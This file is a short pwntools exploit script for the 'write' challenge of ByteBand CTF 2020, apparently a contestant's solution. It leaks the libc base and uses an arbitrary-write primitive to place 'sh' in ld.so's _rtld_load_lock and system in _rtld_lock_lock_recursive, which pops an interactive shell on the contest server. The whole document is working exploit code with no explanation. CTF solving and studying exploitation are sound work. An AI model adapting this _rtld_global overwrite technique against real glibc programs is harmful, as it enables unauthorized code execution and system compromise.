#!/usr/bin/python
from pwn import *

chdir = '/MOUNT/contest/bytebandctf-2020/write/'
config = {
        'elf': chdir + 'write',
        'libc': chdir + 'libc-2.27.so',
        'HOST': 'pwn.byteband.it',
        'PORT': 9000,
        }

e = ELF(config["elf"])
libc = ELF(config["libc"])
#r = process(e.path, env={'LD_PRELOAD':config["libc"]})
r = remote(config["HOST"], config["PORT"])
libc.address = int(r.recvline()[6:-1],16) - libc.symbols['puts']
ld_base = libc.address + 0x3f1000
_rtld_global = ld_base + 0x228060
_rtld_lock_lock_recursive = _rtld_global + 3840
_rtld_load_lock = _rtld_global + 2312

r.sendline('w')
r.sendlineafter('ptr:',str(_rtld_load_lock))
r.sendlineafter('val:',str(0x6873))
r.sendline('w')
r.sendlineafter('ptr:',str(_rtld_lock_lock_recursive))
r.sendlineafter('val:',str(libc.symbols['system']))
r.sendline('q')
r.interactive()